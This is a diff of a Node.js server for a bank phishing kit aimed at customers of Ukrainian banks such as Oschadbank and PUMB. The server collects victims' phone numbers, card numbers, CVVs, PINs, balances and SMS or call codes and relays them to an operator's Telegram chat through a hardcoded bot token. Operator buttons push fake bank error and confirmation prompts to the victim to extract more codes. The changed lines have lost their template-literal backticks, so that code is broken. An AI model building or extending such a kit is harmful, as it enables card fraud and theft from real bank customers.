@@ -1,27 +1,36 @@
-// server.js
 const express = require('express');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
-const path = require('path'); // <-- ДОБАВЬТЕ ЭТУ СТРОКУ
+const path = require('path');
 
 // =======================================================================
-// --- НАСТРОЙКИ: Ваши данные уже вставлены ---
+// --- НАСТРОЙКИ ---
 // =======================================================================
 const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
 const CHAT_ID = -4970332008; 
+// !!! ВАЖЛИВО: Вкажіть URL вашого сервера на Render або іншому хостингу
+const SERVER_URL = 'https://new-l8h6.onrender.com'; 
 // =======================================================================
 
 const app = express();
 app.use(express.json());
 app.use(cors());
-// ...
-app.use(express.json());
-app.use(cors());
-app.use(express.static(path.join(__dirname, 'public')));
-//
+app.use(express.static(path.join(__dirname, 'public'))); // Для обслуговування статичних файлів, якщо потрібно
 
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+// Створюємо бота БЕЗ polling
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
+
+// Встановлюємо webhook
+const webhookPath = /webhook/${TELEGRAM_BOT_TOKEN};
+bot.setWebHook(${SERVER_URL}${webhookPath});
+
+// Endpoint для отримання оновлень від Telegram
+app.post(webhookPath, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
 const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
 
@@ -35,7 +44,7 @@ wss.on('connection', (ws) => {
             const data = JSON.parse(message);
             if (data.type === 'register' && data.sessionId) {
                 clients.set(data.sessionId, ws);
-                console.log(`Client registered: ${data.sessionId}`);
+                console.log(Client registered: ${data.sessionId});
             }
         } catch (e) { console.error('Error processing message:', e); }
     });
@@ -43,7 +52,7 @@ wss.on('connection', (ws) => {
         clients.forEach((clientWs, sessionId) => {
             if (clientWs === ws) {
                 clients.delete(sessionId);
-                console.log(`Client disconnected: ${sessionId}`);
+                console.log(Client disconnected: ${sessionId});
             }
         });
     });
@@ -57,9 +66,9 @@ app.post('/api/submit', (req, res) => {
     sessions.set(sessionId, newData);
     
     if (newData.call_code_input) {
-        let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
-        message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
-        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
+        let message = <b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n;
+        message += <b>Код:</b> <code>${newData.call_code_input}</code>\n;
+        message += <b>Сесія:</b> <code>${sessionId}</code>\n;
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         return res.status(200).json({ message: 'Call code received' });
     }
@@ -68,55 +77,56 @@ app.post('/api/submit', (req, res) => {
         newData.visitCount += 1;
         sessions.set(sessionId, newData);
 
-        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);
+        console.log(Received FINAL data for session ${sessionId}, visit #${newData.visitCount});
 
         let message = '';
         let options;
 
-        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
+        const visitText = newData.visitCount === 1 ? 'NEW' : ${newData.visitCount} раз;
+        const singleStepBanks = ['Ощадбанк', 'Райффайзен'];
 
-        // PUMB special logic
-        if (newData.bankName === 'ПУМБ' && !newData['card-cvv']) {
-            // First PUMB log (phone + card)
-            message = `<b>[ПУМБ - Крок 1] Новий запис!</b>\n\n`;
-            message += `<b>Назва банку:</b> ${newData.bankName}\n`;
-            message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
-            message += `<b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n`;
-            message += `<b>Кількість переходів:</b> ${visitText}\n`;
+        // Логика для банков с двухэтапной авторизацией (все, кроме Ощад и Райф)
+        if (!singleStepBanks.includes(newData.bankName) && !newData['card-cvv']) {
+            message = <b>[Крок 1] Новий запис! (${newData.bankName})</b>\n\n;
+            message += <b>Назва банку:</b> ${newData.bankName}\n;
+            message += <b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n;
+            message += <b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n;
+            message += <b>Кількість переходів:</b> ${visitText}\n;
             
             options = {
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: 'ЗАПРОС', callback_data: `zapit:${sessionId}` }],
-                        [{ text: 'Карта', callback_data: `card_error:${sessionId}` }, { text: 'Номер', callback_data: `number_error:${sessionId}` }]
+
+[{ text: 'ЗАПРОС', callback_data: zapit:${sessionId} }],
+                        [{ text: 'Карта', callback_data: card_error:${sessionId} }, { text: 'Номер', callback_data: number_error:${sessionId} }]
                     ]
                 }
             };
         } else {
-            // Second PUMB log (full details) or any other bank
-            if (newData.bankName === 'ПУМБ') {
-                message = `<b>✅ [ПУМБ - Крок 2] Повні дані!</b>\n\n`;
+            // Логика для второго шага двухэтапных банков или для одноэтапных
+            if (!singleStepBanks.includes(newData.bankName)) {
+                message = <b>✅ [Крок 2] Повні дані! (${newData.bankName})</b>\n\n;
             } else {
-                message = `<b>✅ Новий запис!</b>\n\n`;
+                message = <b>✅ Новий запис! (${newData.bankName})</b>\n\n;
             }
-            message += `<b>Назва банку:</b> ${newData.bankName}\n`;
-            message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
-            message += `<b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n`;
-            if(newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
-            if(newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
-            if(newData.pin) message += `<b>Пін:</b> <code>${newData.pin}</code>\n`;
-            if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
-            message += `<b>Кількість переходів:</b> ${visitText}\n`;
+            message += <b>Назва банку:</b> ${newData.bankName}\n;
+            message += <b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n;
+            message += <b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n;
+            if(newData['card-expiry']) message += <b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n;
+            if(newData['card-cvv']) message += <b>CVV:</b> <code>${newData['card-cvv']}</code>\n;
+            if(newData.pin) message += <b>Пін:</b> <code>${newData.pin}</code>\n;
+            if (newData.balance) message += <b>Поточний баланс:</b> <code>${newData.balance}</code>\n;
+            message += <b>Кількість переходів:</b> ${visitText}\n;
             
             options = {
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: 'SMS', callback_data: `sms:${sessionId}` }, { text: 'ДОДАТОК', callback_data: `app:${sessionId}` }],
-                        [{ text: 'ПІН', callback_data: `pin_error:${sessionId}` }, { text: 'КОД', callback_data: `code_error:${sessionId}` }, { text: 'КОД ✅', callback_data: `timer:${sessionId}` }],
-                        [{ text: 'Карта', callback_data: `card_error:${sessionId}` }, { text: 'Номер', callback_data: `number_error:${sessionId}` }],
-                        [{ text: 'OTHER', callback_data: `other:${sessionId}` }]
+                        [{ text: 'SMS', callback_data: sms:${sessionId} }, { text: 'ДОДАТОК', callback_data: app:${sessionId} }],
+                        [{ text: 'ПІН', callback_data: pin_error:${sessionId} }, { text: 'КОД', callback_data: code_error:${sessionId} }, { text: 'КОД ✅', callback_data: timer:${sessionId} }],
+                        [{ text: 'Карта', callback_data: card_error:${sessionId} }, { text: 'Номер', callback_data: number_error:${sessionId} }],
+                        [{ text: 'OTHER', callback_data: other:${sessionId} }]
                     ]
                 }
             };
@@ -132,12 +142,12 @@ app.post('/api/sms', (req, res) => {
     const { sessionId, code } = req.body;
     const sessionData = sessions.get(sessionId);
     if (sessionData) {
-        let message = `<b>💬 Отримано SMS!</b>\n\n`;
-        message += `<b>Код:</b> <code>${code}</code>\n`;
-        message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
-        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
+        let message = <b>💬 Отримано SMS!</b>\n\n;
+        message += <b>Код:</b> <code>${code}</code>\n;
+        message += <b>Номер телефону:</b> <code>${sessionData.phone}</code>\n;
+        message += <b>Сесія:</b> <code>${sessionId}</code>\n;
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        console.log(`SMS code received for session ${sessionId}`);
+        console.log(SMS code received for session ${sessionId});
         res.status(200).json({ message: 'OK' });
     } else {
         res.status(404).json({ message: 'Session not found' });
@@ -155,15 +165,18 @@ bot.on('callback_query', (callbackQuery) => {
             case 'app': commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." }; break;
             case 'other': commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продвиження пропонуємо вказати картку іншого банку" }; break;
             case 'pin_error': commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" }; break;
-            case 'card_error': commandData = { text: "Вказано невірний номер картки , натисніть назад та введіть номер картки вірно" }; break;
+
+case 'card_error': commandData = { text: "Вказано невірний номер картки , натисніть назад та введіть номер картки вірно" }; break;
             case 'number_error': commandData = { text: "Вказано не фінансовий номер телефону . Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." }; break;
         }
         ws.send(JSON.stringify({ type: type, data: commandData }));
-        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
+        bot.answerCallbackQuery(callbackQuery.id, { text: Команда "${type}" відправлена! });
     } else {
         bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => { console.log(`Server is running on port ${PORT}`); });
+server.listen(PORT, () => { 
+    console.log(Server is running on port ${PORT}); 
+});
